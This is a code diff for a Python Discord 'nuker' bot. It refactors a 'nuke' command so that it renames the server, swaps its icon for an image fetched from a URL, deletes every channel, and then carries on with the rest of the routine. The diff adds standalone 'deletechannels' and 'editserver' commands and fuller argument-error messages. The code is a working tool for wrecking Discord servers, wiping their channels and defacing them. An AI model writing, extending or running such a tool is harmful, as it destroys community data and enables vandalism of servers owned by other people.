@@ -4,14 +4,17 @@ from discord.ext import commands
 import asyncio
 from dotenv import load_dotenv
 import os
+import requests
+from io import BytesIO
+import inspect
 
 # config
 load_dotenv()
-TOKEN = os.getenv("TOKEN")
 
 config = {
     "Prefix": ".",
     "Status": os.getenv("STATUS", "your server"),
+    "Token": os.getenv("TOKEN"),
 }
 
 # intents
@@ -53,7 +56,24 @@ async def on_command(ctx):
 
 @bot.event
 async def on_command_error(ctx, error):
-    await ctx.send(error)
+    if isinstance(error, commands.MissingRequiredArgument) or isinstance(
+        error, commands.BadArgument
+    ):
+        parameters = ctx.command.clean_params
+
+        message = f"Error in command '{ctx.command.qualified_name}':\n```"
+
+        for paramName, param in parameters.items():
+            status = "required" if param.default is inspect._empty else "optional"
+            message += f"- {paramName}: {status}\n"
+
+        message += "```"
+
+        await ctx.send(message)
+
+    else:
+        await ctx.send(error)
+
     print(f"{err} {error}")
 
 
@@ -62,17 +82,9 @@ async def on_command_error(ctx, error):
 async def nuke(ctx, channelCount, messages, channelName, *, message):
     await ctx.send("Starting nuke...")
 
-    for channel in ctx.guild.channels:
-        try:
-            await channel.delete()
-            print(
-                f"{info} Deleted channel {channel.name} in {ctx.guild.name} ({ctx.guild.id})"
-            )
+    await editserver(ctx, channelName)
 
-        except Exception as error:
-            print(
-                f"{err} Couldn't delete channel {channel.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
-            )
+    await deletechannels(ctx)
 
     for i in range(int(channelCount)):
         try:
@@ -181,6 +193,49 @@ async def hoist(ctx, name):
         )
 
 
+@bot.command()
+async def deletechannels(ctx):
+    for channel in ctx.guild.channels:
+        try:
+            await channel.delete()
+            print(
+                f"{info} Deleted channel {channel.name} in {ctx.guild.name} ({ctx.guild.id})"
+            )
+
+        except Exception as error:
+            print(
+                f"{err} Couldn't delete channel {channel.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
+            )
+
+    print(
+        f"{success} All channels have been deleted in {ctx.guild.name} ({ctx.guild.id})"
+    )
+
+
+@bot.command()
+async def editserver(ctx, name, logo=""):
+    try:
+        await ctx.guild.edit(name=name)
+
+        if logo == "":
+            data = None
+
+        else:
+            response = requests.get(logo)
+            data = BytesIO(response.content).read()
+
+        await ctx.guild.edit(icon=data)
+
+        print(
+            f"{success} Guild data succesfully changed for {ctx.guild.name} ({ctx.guild.id})"
+        )
+
+    except Exception as error:
+        print(
+            f"{err} Guild data could not be changed for {ctx.guild.name} ({ctx.guild.id}): {error}"
+        )
+
+
 bot.remove_command("help")
 
 
@@ -194,4 +249,4 @@ async def help(ctx):
     await ctx.send(embed=embed)
 
 
-bot.run(TOKEN)
+bot.run(config["Token"])
